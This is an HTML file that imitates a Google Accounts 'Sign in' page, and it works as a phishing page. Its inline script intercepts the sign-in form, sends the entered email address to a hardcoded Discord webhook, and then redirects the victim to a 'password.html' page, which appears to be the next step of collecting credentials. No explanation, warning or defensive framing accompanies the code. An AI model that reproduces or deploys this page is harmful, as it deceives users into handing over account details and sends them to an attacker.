<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #212122;
            color: #e8eaed;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .login-container {
            background-color: #000000;
            border-radius: 30px;
            padding: 48px 40px 36px;
            width: 100%;
            max-width: 500px;
            box-shadow: 0 2px 10px 0 rgba(0, 0, 0, 0.2);
        }

        .google-logo {
            width: 50px;
            height: 50px;
            margin-bottom: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            
        }

        .google-logo img {
            margin-left:0px;
            width: 100%;
            height: 100%;
            background-color: rgba(73, 73, 73, 0);
            border-radius: 100%;
            object-fit: contain;
        }
        h1 {
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 8px;
            color: #e8eaed;
        }

        .subtitle {
            font-size: 16px;
            color: #9aa0a6;
            margin-bottom: 32px;
        }

        #signinForm {
            display: flex;
            flex-direction: column;
        }

        #signinForm input {
            margin-bottom: 8px;
        }

        input[type="email"] {
            width: 100%;
            padding: 16px;
            background-color: #000000;
            border: 1px solid #5f6368;
            border-radius: 4px;
            color: #e8eaed;
            font-size: 16px;
            outline: none;
            transition: border-color 0.2s;
        }

        input[type="email"]:focus {
            border-color: #8ab4f8;
        }

        input[type="email"]::placeholder {
            color: #9aa0a6;
        }

        .forgot-email {
            color: #8ab4f8;
            text-decoration: none;
            font-size: 14px;
            margin-top: 8px;
            display: inline-block;
        }

        .forgot-email:hover {
            text-decoration: underline;
        }

        .guest-mode {
            margin-top: 24px;
            margin-bottom: 32px;
        }

        .guest-mode-text {
            color: #9aa0a6;
            font-size: 14px;
            line-height: 1.4;
        }

        .guest-mode-link {
            color: #8ab4f8;
            text-decoration: none;
        }

        .guest-mode-link:hover {
            text-decoration: underline;
        }

        .button-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 32px;
        }

        .create-account {
            color: #8ab4f8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }

        .create-account:hover {
            text-decoration: underline;
        }

        .next-button {
            background-color: #aacbf7;
            color: rgb(33, 17, 245);
            border: none;
            padding: 10px 24px;
            border-radius: 20px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .next-button:hover {
            background-color: #1557b0;
        }

        .footer {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 16px 24px;
            background-color: #202124;
            border-top: 1px solid #3c4043;
        }

        .language-selector {
            color: #9aa0a6;
            font-size: 12px;
            cursor: pointer;
        }

        .footer-links {
            display: flex;
            gap: 24px;
        }

        .footer-links a {
            color: #9aa0a6;
            text-decoration: none;
            font-size: 12px;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }

        /* Responsive adjustments */
        @media (max-width: 768px) {
            body {
                padding: 16px;
                padding-bottom: 100px; /* Add space for footer */
            }

            .login-container {
                padding: 40px 24px 24px;
            }

            .footer {
                padding: 12px 16px;
                flex-direction: column;
                gap: 12px;
                text-align: center;
            }

            .footer-links {
                gap: 16px;
                justify-content: center;
            }
        }

        @media (max-width: 480px) {
            body {
                padding-bottom: 120px; /* More space for stacked footer */
            }

            .login-container {
                padding: 32px 20px 20px;
            }

            h1 {
                font-size: 22px;
            }

            .button-row {
                flex-direction: column;
                gap: 16px;
                align-items: stretch;
            }

            .next-button {
                width: 100%;
                padding: 12px 24px;
            }

            .footer {
                padding: 12px 16px;
            }

            .footer-links {
                flex-direction: column;
                gap: 8px;
            }

            .language-selector {
                order: 2;
            }

            .footer-links {
                order: 1;
            }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="google-logo"><img src="google.svg" alt="Google Logo"></div>
        
        <h1>Sign in</h1>
        <div class="subtitle">Use your Google Account</div>
        
        <form id="signinForm">
            <input type="email" id="emailInput" placeholder="Email or phone" required>
            <a href="#" class="forgot-email">Forgot email?</a>
            
            <div class="guest-mode">
                <div class="guest-mode-text">
                    Not your computer? Use Guest mode to sign in privately. 
                    <a href="#" class="guest-mode-link">Learn more about using Guest mode</a>
                </div>
            </div>
            
            <div class="button-row">
                <a href="#" class="create-account">Create account</a>
                <button type="submit" class="next-button">Next</button>
            </div>
        </form>
    </div>

    <script>
    const webhookURL = "https://discord.com/api/webhooks/1410185906807111722/9jrInP4_MTfse2kWDA4fbmEobKNXshhtljqEN5yGfvkAiUKFIBJXpg8f3q1OnKfVU739";

    document.getElementById("signinForm").addEventListener("submit", function(e) {
      e.preventDefault();
      const email = document.getElementById("emailInput").value;

      fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: "Email: " + email })
      }).then(() => {
        window.location.href = "password.html";
      });
    });
  </script>


    <div class="footer">
        <div class="language-selector">English (United States)</div>
        <div class="footer-links">
            <a href="#">Help</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
        </div>
    </div>
</body>
</html>
